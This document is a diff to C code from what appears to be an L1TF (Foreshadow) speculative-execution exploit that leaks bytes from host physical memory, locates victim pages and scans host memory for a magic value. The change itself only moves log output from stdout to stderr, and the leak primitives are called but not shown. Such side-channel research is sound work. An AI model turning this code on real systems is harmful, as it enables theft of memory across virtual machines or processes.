@@ -11,10 +11,10 @@ void experiment_very_slow_leaking_addrs(hpa_t base)
 		for (spectre_evict_amount = 0; spectre_evict_amount <= 1024;
 			spectre_evict_amount = (spectre_evict_amount == 0 ? 1 : 2*spectre_evict_amount)) {
 			for (int it = 0; it < 2; it++) {
-				printf("evamount =%5d  it =%5d", spectre_evict_amount, it); fflush(stdout); printf(CLEAR_LINE);
+				fprintf(stderr, "evamount =%5d  it =%5d", spectre_evict_amount, it); fflush(stdout); fprintf(stderr, CLEAR_LINE);
 			_l1tf_leak((char *)&leaked, base, pa, 8);
 			if (leaked)
-				printf("evamount =%5d  it =%5d  val = %16lx  leaked = %16lx\n", spectre_evict_amount, it, val, leaked);
+				fprintf(stderr, "evamount =%5d  it =%5d  val = %16lx  leaked = %16lx\n", spectre_evict_amount, it, val, leaked);
 			}
 		}
 	}
@@ -23,20 +23,20 @@ void experiment_very_slow_leaking_addrs(hpa_t base)
 void find_victim_page(hpa_t base)
 {
 	void *vp = l1tf_spawn_leak_page();
-	printf("starting l1tf_find_page_pa(%p)...\n", vp);
+	fprintf(stderr, "starting l1tf_find_page_pa(%p)...\n", vp);
 	hpa_t pa = l1tf_find_page_pa(vp);
-	printf("victim page (va %p) at pa %lx\n", vp, pa);
+	fprintf(stderr, "victim page (va %p) at pa %lx\n", vp, pa);
 	l1tf_test(vp, pa, 10000);
 	for (int i = 0; i < 128; i++)
 		*((char *)vp + i) = (char)i;
-	printf("victim page data:\n");
+	fprintf(stderr, "victim page data:\n");
 	display(vp, 128);
-	// printf("forever touching the first two cachelines of victim page now...\n");
+	// fprintf(stderr, "forever touching the first two cachelines of victim page now...\n");
 	// while (1) {
 	// 	*(volatile char *)vp;
 	// 	*((volatile char *)vp + 64);
 	// }
-	printf("forever idle spinning now...\n");
+	fprintf(stderr, "forever idle spinning now...\n");
 	while (1);
 }
 
@@ -45,16 +45,16 @@ void refill_victim_page(hpa_t base)
 	void *vp = l1tf_spawn_leak_page();
 	for (int i = 0; i < 128/8; i++)
 		*((u64 *)vp + i) = ((u64)rand() << 32) | rand();
-	printf("victim page data:\n");
+	fprintf(stderr, "victim page data:\n");
 	display(vp, 128);
-	printf("forever idle spinning now...\n");
+	fprintf(stderr, "forever idle spinning now...\n");
 	while (1);
 }
 
 hpa_t find_other_victim_page(hpa_t base)
 {
 	const int verbose = 1;
-	printf("find_other_victim_page(%lx)\n", base);
+	fprintf(stderr, "find_other_victim_page(%lx)\n", base);
 
 	  uint64_t t_start = clock_read();
 	  u64 themagic = 0x6b8b4567327b23c6;
@@ -68,12 +68,12 @@ hpa_t find_other_victim_page(hpa_t base)
 		pa = l1tf_find_magic16(base, magic, 0, HOST_MEMORY_SIZE, 0x1000, iters);
 		if (pa == -1UL)
 		  break;
-		if (verbose >= 1) printf("l1tf_find_page_pa: run %3d  pa %12lx\n", run, pa);
+		if (verbose >= 1) fprintf(stderr, "l1tf_find_page_pa: run %3d  pa %12lx\n", run, pa);
 	      }
 	      if (off == 8) {
 		if (verbose >= 1) {
 		  double time = (clock_read()-t_start)/1000000000.0;
-		  printf("l1tf_find_page_pa: found pa %lx in %.1f sec\n", pa, time);
+		  fprintf(stderr, "l1tf_find_page_pa: found pa %lx in %.1f sec\n", pa, time);
 		}
 		dump(pa);
 		return pa;
